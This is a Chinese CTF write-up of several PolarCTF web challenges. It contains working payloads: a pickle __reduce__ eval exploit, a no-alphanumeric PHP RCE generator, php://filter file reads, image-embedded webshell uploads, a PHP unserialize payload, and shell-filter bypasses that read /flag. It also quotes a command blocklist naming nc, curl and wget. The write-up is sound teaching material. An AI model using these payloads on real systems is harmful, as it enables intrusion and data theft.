<h3 id="unpickle"><a href="#unpickle" class="headerlink" title="unpickle"></a>unpickle</h3><p>查看附件发现是一个pickle反序列化，但是从cookie处打入的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>构造payload得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line">class exp(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return eval , (&quot;open(&#x27;/flag&#x27;,&#x27;r&#x27;).read()&quot;, )</span><br><span class="line"> </span><br><span class="line">e=exp()</span><br><span class="line">exp = pickle.dumps(e)</span><br><span class="line">user_b64 = base64.b64encode(exp).decode()</span><br><span class="line">print(user_b64)</span><br></pre></td></tr></table></figure>
<h3 id="wu"><a href="#wu" class="headerlink" title="wu"></a>wu</h3><p>分析源码，发现是无数字字母RCE，最简单的思路直接取反 </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>下边是一个脚本，建议用这个y4👴的一站式脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Y4tacker</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-21 20:31:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//或</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">orRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par1</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//异或</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xorRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par1</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//取反</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">negateRce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN));</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//mode=1代表或，2代表异或，3代表取反</span></span><br><span class="line"><span class="comment">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"><span class="variable">$mode</span>, <span class="variable">$preg</span>=<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mode</span>!=<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">256</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = <span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = <span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$par1</span> = <span class="string">&quot;%&quot;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                    <span class="variable">$par2</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = <span class="title function_ invoke__">orRce</span>(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">2</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = <span class="title function_ invoke__">xorRce</span>(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"> </span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$res</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$res</span>)&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$res</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par1</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par2</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">negateRce</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">generate</span>(<span class="number">3</span>,<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>);</span><br><span class="line"><span class="comment">//1代表模式，后面的是过滤规则</span></span><br><span class="line">直接终端执行脚本</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.03.47.png" alt="截屏2025-02-28 17.03.47"></p>
<p>得到flag了</p>
<h3 id="代码审计1"><a href="#代码审计1" class="headerlink" title="代码审计1"></a>代码审计1</h3><p>分析源码,从代码<code>echo new $sys($xsx);</code> 看考查的是对PHP原生类的利用，题目中做了关键字过滤，可尝试使用PHP伪协议结合PHP原生类（SplFileObject）读取文件进行绕过，这里用的是 base64 编码读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 题目</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$sys = $_GET[&#x27;sys&#x27;];</span><br><span class="line">if (preg_match(&quot;|flag|&quot;, $xsx)) &#123;</span><br><span class="line">           die(&quot;flag is no here!&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $xsx = $_GET[&#x27;xsx&#x27;];</span><br><span class="line">    echo new $sys($xsx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造payload<code>?sys=SplFileObject&amp;xsx=php://filter/read=convert.base64-encode/resource=flag.php</code>得到base64进行解码得到flag</p>
<h3 id="你的马呢？"><a href="#你的马呢？" class="headerlink" title="你的马呢？"></a>你的马呢？</h3><p>这个题目肯定是一个上传漏洞，经过多次上传发现对文件内容和后缀进行了检测，那么将一句话木马的php换成=就可以绕过了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.14.51.png" alt="截屏2025-02-28 17.14.51" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.15.54.png" alt="截屏2025-02-28 17.15.54" style="zoom:50%;" /></p>
<p> <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.15.30.png" alt="截屏2025-02-28 17.15.30" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.15.08.png" alt="截屏2025-02-28 17.15.08" style="zoom:50%;" /></p>
<p>成功上传后，用蚁剑连接<code>/index.php?file=uploads/hack.jpg</code>得到flag</p>
<h3 id="随机值"><a href="#随机值" class="headerlink" title="随机值"></a>随机值</h3><p>分析源码，发现是反序列化的随机数,按照反序列化的步骤进行构造payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"><span class="variable">$flag</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$Polar2</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Polar1 === <span class="variable language_">$this</span>-&gt;Polar2)&#123;</span><br><span class="line">            <span class="variable">$Light</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Night === <span class="variable language_">$this</span>-&gt;Light)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Your wrong!!!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;sys&#x27;</span>]);</span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getflag</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造payload,得到flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar1</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$Polar2</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Night</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$Light</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Index</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment">//payload:?sys=O%3A5%3A%22Index%22%3A4%3A%7Bs%3A13%3A%22%00Index%00Polar1%22%3Bi%3A1%3Bs%3A13%3A%22%00Index%00Polar2%22%3Bi%3A1%3Bs%3A8%3A%22%00%2A%00Night%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22%00%2A%00Light%22%3Bs%3A1%3A%22a%22%3B%7D</span></span><br></pre></td></tr></table></figure>
<h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>先根据访问URL后的提示查看robots.txt下有什么东西，发现有file和upload，那么肯定是先上传木马然后读取木马，用蚁剑连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.35.19.png" alt="截屏2025-02-28 17.35.19" style="zoom:50%;" /></p>
<p>访问/file</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.35.46.png" alt="截屏2025-02-28 17.35.46" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.35.54.png" alt="截屏2025-02-28 17.35.54" style="zoom:50%;" /></p>
<p>返回去访问upload</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.36.22.png" alt="截屏2025-02-28 17.36.22" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.36.33.png" alt="截屏2025-02-28 17.36.33" style="zoom:50%;" /></p>
<p>经过上传测试只能上传图片，那就传个图片马，上传后用file访问一下得到文件路径<code>../uploads/images/hack.jpg</code>,用蚁剑连接</p>
<p><code>http://5843cbd8-e32c-463b-8a13-7dfb65a381dc.www.polarctf.com:8090/file/file.php?filename=../uploads/images/hack.jpg</code></p>
<p>得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.40.21.png" alt="截屏2025-02-28 17.40.21" style="zoom:50%;" /></p>
<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p>根据提示，用dirsearch进行扫描，然后发现点我开始不能点，直接修改代码去掉<code>disabled=&quot;disabled&quot;</code>就可以跳转到上传页面，这个上传没有进行过滤直接上传就行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.46.23.png" alt="截屏2025-02-28 17.46.23" style="zoom:50%;" /></p>
<p>扫描完发现上传的路径直接用蚁剑连接得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-02-28 17.47.37.png" alt="截屏2025-02-28 17.47.37" style="zoom:50%;" /></p>
<h3 id="tnl"><a href="#tnl" class="headerlink" title="tnl"></a>tnl</h3><p>经过多次测试注入，发现不是注入，那么猜测一下是不是伪协议</p>
<p><code>twothree=php://filter/convert.base64-encode/index/resource=index</code></p>
<p>然后解密base64得到源码，发现自动添加.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;twothree&quot;</span>&gt;Please input your ID:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;twothree&quot;</span> name=<span class="string">&quot;twothree&quot;</span> required&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;twothree&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;1&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;2&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后构造payload<code>php://filter/read=convert.base64-encode/resource=flag</code>得到flag</p>
<h3 id="你知道sys还能这样玩吗"><a href="#你知道sys还能这样玩吗" class="headerlink" title="你知道sys还能这样玩吗"></a>你知道sys还能这样玩吗</h3><p>根据提示访问一下sys.php，分析源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;cmd&#x27;]))&#123;</span><br><span class="line">    echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">    $cmd = $_POST[&#x27;cmd&#x27;];</span><br><span class="line">    if (!preg_match(&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;, $cmd)) &#123;</span><br><span class="line">        $output = system($cmd);</span><br><span class="line">        echo $output;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<p>方法一：尝试php -r来进行二次执行，ff是进行的一个绕过执行，否则得不到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r &#x27;system(hex2bin(&quot;6c73202e2e2f&quot;));&#x27;</span><br><span class="line">查看</span><br><span class="line">cmd=php -r &#x27;system(hex2bin(ff3b636174202f666c61672e747874));&#x27;</span><br></pre></td></tr></table></figure>
<p>方法二：这里看到一个师傅利用了printf和双引号绕过base64加密的方法得到了答案，也放在这，还是比较巧妙的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=`printf &quot;Y2F0IC8q&quot;|bas&quot;&quot;e64 -d`</span><br></pre></td></tr></table></figure>
<p>方法三：上面几个都是借鉴的，还有一个办法就是八进制转化，之前写xyctf有一个和这样类似的，我就直接上payload了,空格用$&lt;进行绕过<a target="_blank" rel="noopener" href="https://0ran9ewww.github.io/2024/04/26/XYCTFwp及个人复盘/">文章</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=$%27\143\141\164%27%3c$%27\57\146\154\141\147\56\164\170\164%27</span><br></pre></td></tr></table></figure>
<h3 id="笑傲上传"><a href="#笑傲上传" class="headerlink" title="笑傲上传"></a>笑傲上传</h3><p>首先看到下边这个页面，发现神秘链接可以跳转，出现了代码，感觉应该是先上传文件，然后在源码这里进行file传参，用蚁剑连接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-01 09.15.01.png" alt="截屏2025-03-01 09.15.01" style="zoom:50%;" /></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-01 09.14.20.png" alt="截屏2025-03-01 09.14.20" style="zoom:50%;" /></p>
<p>试一下上传，发现只能上传图片的，那么直接将木马拼接在图片后边</p>
<p><code>cat hack.php &gt;&gt; tou.jpg</code>，然后上传文件，发现上传成功了，然后用蚁剑连接</p>
<p><code>http://00112188-145b-45ab-a6f6-124c0de1a115.www.polarctf.com:8090/include.php?file=/var/www/html/upload/6120250301011149.jpg</code>得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gcore.jsdelivr.net/gh/guipi01/images@main/截屏2025-03-01 09.18.44.png" alt="截屏2025-03-01 09.18.44" style="zoom:50%;" /></p>
<h2 id="REVERSE-逆向"><a href="#REVERSE-逆向" class="headerlink" title="REVERSE 逆向"></a>REVERSE 逆向</h2><h3 id="康师傅"><a href="#康师傅" class="headerlink" title="康师傅"></a>康师傅</h3><p>首先去EPinfo查看是否加壳，没有加壳用IDA进行查看主函数，找到了main函数，进行分析这段代码是将Str1与9进行异或来加密的，然后编写python进行解密</p>
